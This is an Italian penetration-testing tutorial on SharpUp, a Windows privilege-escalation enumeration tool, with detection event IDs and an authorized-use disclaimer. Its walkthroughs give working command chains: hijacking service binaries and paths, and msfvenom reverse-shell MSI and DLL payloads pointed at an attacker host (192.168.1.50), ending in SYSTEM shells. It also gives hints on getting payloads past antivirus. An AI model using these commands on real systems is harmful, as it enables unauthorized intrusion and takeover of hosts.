---
title: 'SharpUp Windows: Privilege Escalation e Local Enumeration'
slug: sharpup
description: 'Guida a SharpUp su Windows per individuare vettori di privilege escalation: servizi modificabili, DLL hijacking, registry, GPP, token privileges e altri check.'
image: /Gemini_Generated_Image_ml40maml40maml40.webp
draft: false
date: 2026-02-25T00:00:00.000Z
lastmod: 2026-09-15T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - misconfiguration
  - SharpUp
  - Windows Privilege Escalation
  - PowerUp
  - GhostPack
---

# SharpUp: Privilege Escalation Enumeration su Windows

SharpUp è il port in C# di una parte delle funzionalità di PowerUp.ps1, mantenuto da GhostPack. Il repository ufficiale è chiaro su un punto che vale la pena tenere a mente per tutto l'articolo: **sono stati portati solo i check più comuni, e non sono implementate funzioni di weaponization**. SharpUp identifica condizioni potenzialmente sfruttabili — l'exploitation vera e propria, quando esiste un vettore, la fai con altri comandi o tool, dopo aver validato manualmente che la condizione sia reale.

```text
Foothold
   |
Host enumeration (Seatbelt/winPEAS per il quadro generale)
   |
SharpUp (check mirati di privesc)
   |
Finding
   |
Validazione manuale (permessi, account, riavvio possibile)
   |
Exploitation con la tecnica appropriata
   |
SYSTEM
```

## SharpUp vs PowerUp vs Seatbelt vs winPEAS

| Tool                                              | Linguaggio | Domanda a cui risponde                                           |
| ------------------------------------------------- | ---------- | ---------------------------------------------------------------- |
| SharpUp                                           | C#         | Ci sono vettori di local privesc tra i check portati da PowerUp? |
| PowerUp                                           | PowerShell | Stesso obiettivo, coverage più ampia, più facilmente rilevato    |
| [Seatbelt](https://hackita.it/articoli/seatbelt/) | C#         | Cosa c'è su questa macchina in generale? (host survey)           |
| [winPEAS](https://hackita.it/articoli/winpeas/)   | C#/batch   | Enumerazione privesc molto più ampia di SharpUp                  |

SharpUp e Seatbelt non fanno la stessa cosa: Seatbelt ti dà un quadro generale dell'host, SharpUp è mirato sui vettori di privilege escalation specifici che PowerUp sapeva già cercare. Un workflow tipico li usa in sequenza, non in alternativa.

## Setup

```bash
git clone https://github.com/GhostPack/SharpUp.git
```

Non esistono release binarie ufficiali — il progetto richiede compilazione da sorgente (Visual Studio, build Release, target .NET 3.5). Trasferimento sul target:

```powershell
IWR http://192.168.1.50/SharpUp.exe -OutFile C:\Windows\Temp\su.exe
```

```cmd
certutil -urlcache -split -f http://192.168.1.50/SharpUp.exe C:\Windows\Temp\su.exe
```

## Sintassi e Audit Mode

```text
SharpUp.exe [audit] [check1] [check2]...
```

`audit` forza l'esecuzione dei check **indipendentemente dal livello di integrità del processo o dall'appartenenza al gruppo amministratori locali**. Senza `audit`, alcuni check possono essere saltati se il contesto non li rende rilevanti (es. sei già high integrity). Se specifichi `audit` senza altri argomenti, esegue tutti i check; se lo fai seguire da nomi di check specifici, esegue solo quelli, ma in modalità forzata.

```cmd
SharpUp.exe audit
```

Tutti i check, forzati.

```cmd
SharpUp.exe HijackablePaths
```

Solo quel check, comportamento normale (può essere saltato se il contesto non lo rende applicabile).

```cmd
SharpUp.exe audit UnquotedServicePath
```

Solo quel check, ma forzato indipendentemente dal contesto.

**Nota:** in modalità `audit` da un processo già high integrity, alcuni check possono restituire condizioni che in pratica non ti servono (sei già SYSTEM-adjacent) — leggi sempre il risultato nel contesto in cui lo hai lanciato.

## I Check Disponibili

Questi sono i nomi reali richiesti dal binario — copia esattamente questi, non varianti "intuitive":

| Check                           | Cosa cerca                                                                  |
| ------------------------------- | --------------------------------------------------------------------------- |
| `ModifiableServices`            | Servizi la cui configurazione è modificabile dall'utente corrente           |
| `ModifiableServiceBinaries`     | Eseguibili di servizio scrivibili                                           |
| `ModifiableServiceRegistryKeys` | Chiavi di registro dei servizi modificabili                                 |
| `UnquotedServicePath`           | Path di servizio senza apici, con spazi nel percorso                        |
| `AlwaysInstallElevated`         | Chiavi registro che permettono install MSI con privilegi elevati            |
| `ModifiableScheduledTask`       | Scheduled task con azione modificabile                                      |
| `ProcessDLLHijack`              | Possibilità di dirottare il caricamento DLL di un processo                  |
| `HijackablePaths`               | Percorsi modificabili nella variabile `%PATH%` dell'utente                  |
| `RegistryAutoruns`              | Chiavi Run/RunOnce con eseguibile scrivibile                                |
| `RegistryAutoLogons`            | Credenziali di autologon salvate in chiaro nel registro                     |
| `TokenPrivileges`               | Privilegi del token corrente potenzialmente sfruttabili (es. SeImpersonate) |
| `CachedGPPPassword`             | Password Group Policy Preferences cached e decifrabili                      |
| `DomainGPPPassword`             | Stessa categoria, cercata a livello di dominio                              |
| `UnattendedInstallFiles`        | File di installazione unattended con credenziali                            |
| `McAfeeSitelistFiles`           | File di configurazione McAfee con credenziali                               |

## Come Leggere un Finding Prima di Agire

Un finding di SharpUp non è un exploit pronto: è una condizione da verificare. Lo schema mentale da applicare a ogni check:

```text
Finding SharpUp
   |
Cosa significa esattamente questa condizione?
   |
Quale permesso specifico la rende sfruttabile?
   |
Con quale account gira il processo/servizio coinvolto?
   |
Riesco a riprodurre la condizione manualmente?
   |
Solo ora: è davvero exploitabile
```

Esempio concreto — finding `ModifiableServiceBinaries`:

```text
Name: BackupService
Path: C:\Backup\backup.exe
```

Prima di sostituire il binario, verifica: con quale account gira il servizio (`sc qc BackupService`), se hai davvero permesso di scrittura sul file (`icacls`), e se puoi riavviare il servizio con l'utente corrente. Solo se tutte e tre sono vere il finding diventa un percorso reale verso privilege escalation.

## Modifiable Services

```cmd
SharpUp.exe ModifiableServices
```

```text
Name       : BackupService
PathName   : C:\Backup\backup.exe
StartMode  : Auto
CanRestart : True
```

Se puoi modificare la configurazione del servizio, puoi puntarlo direttamente al tuo payload:

```cmd
sc config BackupService binpath= "C:\Windows\Temp\shell.exe"
sc stop BackupService
sc start BackupService
```

## Modifiable Service Binaries

```cmd
SharpUp.exe ModifiableServiceBinaries
```

Se il binario stesso (non la config) è scrivibile, lo sostituisci direttamente:

```cmd
move C:\Backup\backup.exe C:\Backup\backup.exe.bak
copy C:\Windows\Temp\shell.exe C:\Backup\backup.exe
sc stop BackupService
sc start BackupService
```

## Unquoted Service Path

```cmd
SharpUp.exe UnquotedServicePath
```

```text
Name       : UpdateManager
PathName   : C:\Program Files\Update Manager\Service\update.exe
```

Un path senza apici e con spazi permette a Windows di interpretare tronconi del percorso come eseguibili alternativi. **Non è automaticamente sfruttabile**: serve avere permesso di scrittura su una delle directory intermedie del percorso.

```cmd
icacls "C:\Program Files\Update Manager"
```

Se scrivibile:

```cmd
copy C:\Windows\Temp\shell.exe "C:\Program Files\Update.exe"
sc stop UpdateManager
sc start UpdateManager
```

## AlwaysInstallElevated

```cmd
SharpUp.exe AlwaysInstallElevated
```

```text
[!] HKLM AlwaysInstallElevated: 1
[!] HKCU AlwaysInstallElevated: 1
```

**Entrambe** le chiavi (HKLM e HKCU) devono essere impostate a 1: con una sola delle due la condizione non è sfruttabile. Se entrambe sono presenti, Windows Installer esegue pacchetti MSI con privilegi SYSTEM indipendentemente da chi li lancia.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f msi -o shell.msi
```

```cmd
msiexec /quiet /qn /i \\192.168.1.50\share\shell.msi
```

## Process DLL Hijack

```cmd
SharpUp.exe ProcessDLLHijack
```

Cerca DLL che un processo carica da un percorso su cui hai permesso di scrittura — è una condizione più specifica del generico "DLL hijacking": qui SharpUp verifica il caso in cui il search order di un processo in esecuzione punta a una directory modificabile.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f dll -o helper.dll
```

```cmd
copy helper.dll C:\CustomApp\helper.dll
```

Il trigger dipende dal processo: alcuni servizi la ricaricano al riavvio, altri richiedono che il processo venga rilanciato in altro modo — verifica come si attiva il caricamento prima di aspettarti risultati automatici.

## Registry Autoruns e AutoLogons

```cmd
SharpUp.exe RegistryAutoruns
```

Cerca chiavi Run/RunOnce con eseguibile scrivibile — se lo trovi, sostituisci l'eseguibile e attendi che l'evento che triggera quella entry (logon, boot, a seconda della chiave) si verifichi:

```cmd
copy C:\Windows\Temp\shell.exe C:\Users\Public\update.exe
```

`RegistryAutoLogons` è un check diverso: cerca credenziali di autologon salvate in chiaro nel registro, non richiede scrittura di nulla, solo lettura.

```cmd
SharpUp.exe RegistryAutoLogons
```

## GPP Password

```cmd
SharpUp.exe CachedGPPPassword
SharpUp.exe DomainGPPPassword
```

Group Policy Preferences ha storicamente memorizzato password cifrate con una chiave AES-256 che Microsoft ha pubblicato in chiaro nella documentazione MSDN dopo la scoperta della debolezza (MS14-025) — se SharpUp trova un file GPP con password cached, è decifrabile direttamente, non serve bruteforce:

```powershell
# Get-GPPPassword.ps1 (PowerSploit) automatizza ricerca + decrypt
Get-GPPPassword

# oppure decrypt manuale della stringa cpassword trovata nell'XML
```

Utile soprattutto in ambienti domain-joined con GPO legacy mai ripulite dopo la patch del 2014 che ha smesso di generarne di nuove — i file vecchi restano sul SYSVOL finché qualcuno non li rimuove esplicitamente.

## Token Privileges

```cmd
SharpUp.exe TokenPrivileges
```

Elenca i privilegi del token corrente. Alcuni, se presenti e abusabili (tipicamente `SeImpersonatePrivilege`), aprono la strada a tecniche di tipo potato/juicy potato — SharpUp segnala solo la presenza del privilegio, la tecnica di sfruttamento è un passo separato.

## Scenario Pratico: Modifiable Service Binaries

Shell utente standard su una workstation, obiettivo SYSTEM.

```cmd
SharpUp.exe audit ModifiableServiceBinaries
```

```text
Name       : WebUpdater
PathName   : C:\WebApp\updater.exe  [WRITABLE]
StartMode  : Auto
CanRestart : True
```

```cmd
move C:\WebApp\updater.exe C:\WebApp\updater.exe.bak
copy C:\Windows\Temp\shell.exe C:\WebApp\updater.exe
sc stop WebUpdater
sc start WebUpdater
```

```text
# Sul listener
C:\Windows\system32> whoami
nt authority\system
```

**Se `CanRestart: False`** — non hai permesso di riavviare il servizio con l'utente corrente: attendi un riavvio naturale (reboot, crash recovery) o cerca un altro vettore, non forzare.

**Se il binario non è scrivibile ma la configurazione sì** — passa a `ModifiableServices` e cambia `binpath` invece di sostituire il file.

**Se l'AV blocca il payload** — prova un formato diverso (DLL invece di EXE per un vettore `ProcessDLLHijack`) o un payload meno riconoscibile: questo articolo non copre evasion, solo il vettore di privesc.

## Scenario Pratico: AlwaysInstallElevated

```cmd
SharpUp.exe audit AlwaysInstallElevated
```

```text
[!] HKLM: 1
[!] HKCU: 1
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=443 -f msi -o update.msi
```

```cmd
msiexec /quiet /qn /i \\192.168.1.50\share\update.msi
```

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**Se vedi solo HKCU o solo HKLM a 1** — non è sfruttabile: servono entrambe. Non perdere tempo a forzare l'installazione, cerca un altro check.

**Se l'MSI viene bloccato** — è quasi sempre detection sulla firma del payload generato da msfvenom, non un problema della tecnica: il vettore resta valido, cambia il modo in cui generi il pacchetto.

## Automazione su Più Host

Se hai accesso amministrativo remoto (WinRM/PSRemoting) su più macchine, lo stesso check si lancia in loop invece che a mano una per una:

```powershell
$targets = @("WS01", "WS02", "WS03")
foreach ($t in $targets) {
    Invoke-Command -ComputerName $t -ScriptBlock {
        C:\Windows\Temp\su.exe audit
    }
}
```

Utile per un triage rapido su un intero segmento durante un internal assessment, prima di concentrarti manualmente sui finding più promettenti.

## Cleanup

Se lo scope dell'engagement lo richiede, ripristina lo stato originale prima di chiudere:

```cmd
move C:\WebApp\updater.exe.bak C:\WebApp\updater.exe
sc stop WebUpdater
sc start WebUpdater
del C:\Windows\Temp\su.exe
```

Documenta sempre cosa hai modificato e quando lo hai ripristinato: è parte dell'evidenza per il report tanto quanto lo screenshot dell'accesso SYSTEM.

## Da SharpUp a Post-Exploitation

Una volta ottenuto SYSTEM tramite uno dei vettori sopra, il lavoro esce dallo scope di SharpUp:

```text
SYSTEM locale
   |
Credential access — Mimikatz
   |
Pass-the-Hash / lateral movement
   |
Enumerazione e attacco AD
```

Per questi passi successivi: [Mimikatz](https://hackita.it/articoli/mimikatz/), [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/), [DCSync](https://hackita.it/articoli/dcsync/), [PsExec](https://hackita.it/articoli/psexec/). Non li duplico qui: SharpUp finisce quando finisce il local privilege escalation.

## Execute-Assembly

```text
beacon> execute-assembly /tools/SharpUp.exe audit
```

In framework di post-exploitation compatibili con .NET, l'assembly può essere caricato in memoria senza lasciare il binario SharpUp come file separato sul disco. Questo riduce un artefatto specifico (il file .exe droppato), non equivale ad evasione EDR/AV: il comportamento del processo (accesso a servizi, registro, file) resta osservabile a prescindere da come è stato caricato il codice.

## Detection

| Indicatore                               | Log                            | Cosa osservare                                         |
| ---------------------------------------- | ------------------------------ | ------------------------------------------------------ |
| Esecuzione di SharpUp/binario rinominato | Sysmon Event ID 1              | Process creation, hash noti anche se rinominato        |
| Modifica configurazione servizio         | Event ID 7045 (nuovo servizio) | Servizi creati/modificati fuori orario di manutenzione |
| Sostituzione file                        | Event ID 4663                  | Scritture su path di servizi esistenti                 |
| Installazione MSI                        | Event ID 1033/1042             | MSI installati da utenti non amministrativi            |

## Troubleshooting

**Nessun risultato con un check specifico** — verifica se il contesto lo esclude senza `audit`: rilancia con `audit <check>` per forzarlo.

**"Nessuna vulnerabilità trovata"** — significa solo che *i check eseguiti* non hanno trovato condizioni, non che il sistema sia sicuro nel complesso. SharpUp copre un sottoinsieme mirato delle tecniche di PowerUp: per coverage più ampia serve [winPEAS](https://hackita.it/articoli/winpeas/) o PowerUp stesso.

**Nome del check rifiutato** — controlla la tabella sopra: i nomi sono case-sensitive e non hanno alias (`HijackableDLLs` non esiste, il check si chiama `ProcessDLLHijack`).

**Compilazione fallita** — SharpUp è costruito contro .NET 3.5: verifica che il target framework del progetto in Visual Studio corrisponda, non aggiornarlo assumendo compatibilità automatica.

## Cheat Sheet

```text
SharpUp.exe audit                          # tutti i check, forzati
SharpUp.exe <check>                        # un check, comportamento normale
SharpUp.exe audit <check>                  # un check, forzato

ModifiableServices
ModifiableServiceBinaries
ModifiableServiceRegistryKeys
UnquotedServicePath
AlwaysInstallElevated
ModifiableScheduledTask
ProcessDLLHijack
HijackablePaths
RegistryAutoruns
RegistryAutoLogons
TokenPrivileges
CachedGPPPassword
DomainGPPPassword
UnattendedInstallFiles
McAfeeSitelistFiles
```

## FAQ

**SharpUp è il port completo di PowerUp?**
No. Il repository ufficiale specifica che sono stati portati solo i check più comuni, e non ci sono funzioni di weaponization: SharpUp identifica, non sfrutta automaticamente.

**Serve essere amministratore per usarlo?**
No, gira come utente standard. `audit` forza i check anche fuori dai contesti in cui normalmente verrebbero saltati.

**Qual è la differenza tra SharpUp e PowerUp?**
Stesso obiettivo di fondo, linguaggio diverso: SharpUp è C# (compilabile, eseguibile via `execute-assembly` in framework compatibili), PowerUp è PowerShell con coverage più ampia ma più facilmente intercettato da logging PowerShell/AMSI.

**Un finding di SharpUp è sempre sfruttabile?**
No. Indica che una condizione è presente — permessi, account che esegue il processo, possibilità di riavvio vanno verificati manualmente prima di considerarla un percorso reale.

**SharpUp trova tutte le privesc possibili?**
No, copre un sottoinsieme mirato. Per coverage più ampia usa winPEAS o PowerUp in aggiunta, non al posto di una verifica manuale.

***

**Repository ufficiale:** [GhostPack/SharpUp](https://github.com/GhostPack/SharpUp). Uso consentito esclusivamente in ambienti autorizzati (lab, CTF, HTB, PG o engagement con consenso scritto).
